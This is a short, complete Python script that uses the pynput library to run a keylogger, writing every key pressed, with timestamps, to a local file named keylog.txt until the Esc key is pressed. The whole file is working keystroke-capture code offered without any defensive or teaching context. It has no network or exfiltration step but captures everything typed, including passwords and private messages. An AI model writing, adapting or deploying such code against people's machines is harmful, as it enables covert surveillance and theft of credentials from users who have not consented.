#!/bin/python3

import logging
from pynput import keyboard

# Correct logging format (note: 'message', not 'messeage')
logging.basicConfig(
    filename='keylog.txt',
    level=logging.DEBUG,
    format='%(asctime)s > %(message)s'
)

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

def on_release(key):
    if key == keyboard.Key.esc:
        logging.info('Keylogger terminated')
        return False

# Start listener properly
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
